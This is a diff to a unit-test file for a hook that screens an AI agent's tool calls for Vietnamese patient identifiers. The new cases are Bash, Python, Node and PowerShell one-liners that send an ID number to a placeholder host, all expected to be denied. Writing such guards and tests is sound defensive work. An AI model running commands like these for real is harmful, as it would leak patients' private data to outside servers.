@@ -62,6 +62,16 @@ CASES = [
     ({"q": "BN: NGUYỄN AN"}, "deny"),
     # I5: URL fragments are scanned
     ({"url": "https://example.org/page#cccd=079123456789"}, "deny"),
+    # R5: a name found only through a synthesised "key: value" is weak unless the key is patient-specific
+    ({"name": "Weekly Lab Meeting"}, "ask"),
+    ({"name": "Thesis Draft Folder"}, "ask"),
+    ({"name": "Nguyễn Văn Bình"}, "ask"),
+    ({"patient": "Nguyen Van An"}, "deny"),
+    ({"ho_ten": "Nguyễn Văn Bình"}, "deny"),
+    ({"Họ tên": "Nguyễn Văn Bình"}, "deny"),
+    ({"ten_benh_nhan": "Nguyễn Văn Bình"}, "deny"),
+    ({"benh_nhan": "Nguyễn Văn Bình"}, "deny"),
+    ({"name": "x", "note": "Name: Nguyen Van An"}, "deny"),
 ]
 
 BASH_CASES = [
@@ -77,6 +87,34 @@ BASH_CASES = [
     ({"command": "grep -c 079123456789 00_inputs/data.csv"}, None),
     ({"command": "python -c \"print('079 123 456789')\""}, None),
     ({"command": 'python search_lit.py search "metformin PCOS"'}, None),
+    # R4: more ways to send data out from a shell
+    ({"command": "python - <<'EOF'\nimport urllib.request\nurllib.request.urlopen('https://x.org/?c=079123456789')\nEOF"},
+     "deny"),
+    ({"command": "python3 <<EOF\nimport requests\nrequests.get('https://x.org/', params={'c': '079123456789'})\nEOF"},
+     "deny"),
+    ({"command": "python -c \"import http.client as h; c = h.HTTPSConnection('x.org'); c.request('GET', '/?c=079123456789')\""},
+     "deny"),
+    ({"command": "py -c \"import urllib.request as u; u.urlopen('https://x.org/?c=079123456789')\""}, "deny"),
+    ({"command": 'py search_lit.py search "CCCD 079 123 456789"'}, "deny"),
+    ({"command": "node -e \"fetch('https://x.org/?c=079123456789')\""}, "deny"),
+    ({"command": "node -e \"require('https').get('https://x.org/?c=079123456789')\""}, "deny"),
+    ({"command": "node -e \"console.log('079123456789')\""}, None),
+    ({"command": "python - <<'EOF'\nprint('079123456789')\nEOF"}, None),
+]
+
+POWERSHELL_CASES = [
+    ({"command": "Invoke-RestMethod 'https://x.org/?c=079123456789'"}, "deny"),
+    ({"command": "irm https://x.org/?c=079123456789"}, "deny"),
+    ({"command": "iwr https://x.org/?c=079123456789"}, "deny"),
+    ({"command": "Invoke-WebRequest -Uri https://x.org/?c=079123456789"}, "deny"),
+    ({"command": "curl.exe 'https://x.org/?c=079123456789'"}, "deny"),
+    ({"command": "Start-BitsTransfer -Source https://x.org/079123456789 -Destination out.txt"}, "deny"),
+    ({"command": "py -c \"import requests; requests.get('https://x.org', params={'c': '079123456789'})\""}, "deny"),
+    ({"command": 'py search_lit.py search "BN: Trần Văn An"'}, "deny"),
+    ({"command": "Invoke-RestMethod 'https://x.org/?q=0903123456'"}, "ask"),
+    # local commands are allowed even when they mention an identifier
+    ({"command": "Get-Content 00_inputs\\data.csv | Select-String 079123456789"}, None),
+    ({"command": "python -c \"print('079 123 456789')\""}, None),
 ]
 
 
@@ -188,7 +226,7 @@ class TestPhiScan(unittest.TestCase):
     def test_hooks_json_targets_outbound_tools(self):
         hj = json.loads((PHI_SCRIPTS.parent / "hooks" / "hooks.json").read_text(encoding="utf-8"))
         entry = hj["hooks"]["PreToolUse"][0]
-        self.assertEqual(entry["matcher"], "mcp__.*|WebFetch|WebSearch|Bash")
+        self.assertEqual(entry["matcher"], "mcp__.*|WebFetch|WebSearch|Bash|PowerShell")
         self.assertIn("phi_scan.py", entry["hooks"][0]["command"])
 
     # I6: Bash commands that send queries out are scanned; local commands are not
@@ -196,6 +234,14 @@ class TestPhiScan(unittest.TestCase):
         for tool_input, want in BASH_CASES:
             with self.subTest(tool_input=tool_input):
                 d = phi_scan.decide("Bash", tool_input)
+                got = d["permissionDecision"] if d else None
+                self.assertEqual(got, want, tool_input)
+
+    # R4: PowerShell uses the same outbound-only branch as Bash
+    def test_powershell_outbound_commands(self):
+        for tool_input, want in POWERSHELL_CASES:
+            with self.subTest(tool_input=tool_input):
+                d = phi_scan.decide("PowerShell", tool_input)
                 got = d["permissionDecision"] if d else None
                 self.assertEqual(got, want, tool_input)
 
